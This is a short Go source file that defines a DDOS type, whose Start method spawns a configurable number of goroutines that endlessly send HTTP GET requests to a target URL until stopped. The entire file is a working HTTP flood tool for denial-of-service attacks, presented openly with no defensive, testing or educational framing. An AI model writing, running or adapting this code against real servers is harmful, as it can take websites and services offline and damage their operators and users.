package main

import (
	"io"
	"io/ioutil"
	"net/http"
)

type DDOS struct {
	target string
	is_run bool
	capacity uint
	stopped chan bool
}

func NewDDOS(target string, capacity uint) *DDOS {
	return &DDOS{
		target: target,
		is_run: false,
		capacity: capacity,
		stopped: make(chan bool),
	}
}

func (ddos *DDOS) Target() string {
	return ddos.target
}

func (ddos *DDOS) Start() {
	ddos.is_run = true
	for i := uint(0); i < ddos.capacity; i++ {
		go runDDOS(ddos)
	}
}

func runDDOS(ddos *DDOS) {
	for {
		select {
		case <-ddos.stopped:
			return
		default:
			resp, err := http.Get(ddos.target)
			if err != nil {
				continue
			}
			io.Copy(ioutil.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func (ddos *DDOS) Stop() {
	if !ddos.is_run {
		return
	}
	for i := uint(0); i < ddos.capacity; i++ {
		ddos.stopped <- true
	}
	ddos.is_run = false
}
